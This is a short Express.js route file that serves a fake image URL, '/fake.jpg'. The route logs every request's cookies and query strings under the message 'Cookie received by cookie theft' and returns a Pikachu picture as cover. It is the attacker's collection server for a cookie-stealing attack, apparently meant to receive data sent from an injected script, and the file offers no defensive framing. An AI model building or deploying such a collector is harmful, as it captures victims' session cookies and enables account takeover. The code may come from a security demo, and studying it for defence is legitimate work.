var express = require('express');
var router = express.Router();
const path = require('path');

router.get('/fake.jpg', function(req, res, next) {
  console.log('\n\nCookie received by cookie theft:');
  console.log(JSON.stringify(req.cookies, null, 2));
  console.log('Query Strings:');
  console.log(JSON.stringify(req.query, null, 2));
  // res.send('Your cookie is parsed :)');
  // res.sendfile('public/images/pikachu.jpg');
  res.sendFile(path.join(__dirname, '..', 'public', 'images', 'pikachu.jpg'));
});

module.exports = router;
